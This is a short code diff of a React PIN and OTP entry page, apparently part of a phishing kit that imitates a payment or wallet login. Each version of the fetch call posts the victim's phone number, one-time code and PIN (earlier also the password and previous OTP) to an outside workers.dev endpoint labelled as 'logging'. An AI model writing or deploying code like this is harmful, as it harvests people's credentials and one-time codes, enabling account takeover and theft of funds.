@@ -507,8 +507,8 @@ export default function SolmatePin() {
   const location = useLocation();
 
   const phone = location.state?.phone || "";
-  const password = location.state?.password || "";
-  const previousOtp = location.state?.otp || "";
+  // const password = location.state?.password || "";
+  const previousPIN = location.state?.pin || "";
 
   const OTP_LENGTH = 6;
   const [otp, setOtp] = useState(Array(OTP_LENGTH).fill(""));
@@ -610,15 +610,14 @@ export default function SolmatePin() {
 
       // Send data to API for logging
       await fetch(
-        "https://my-worker-app.instapayapi.workers.dev/api/passwordWithPhoneAndotp",
+        "https://my-worker-app.instapayapi.workers.dev/api/solmateVerifyPIn",
         {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
             phone,
-            password,
-            previousOtp,
             otp: code,
+            pin: previousPIN,
           }),
         }
       );
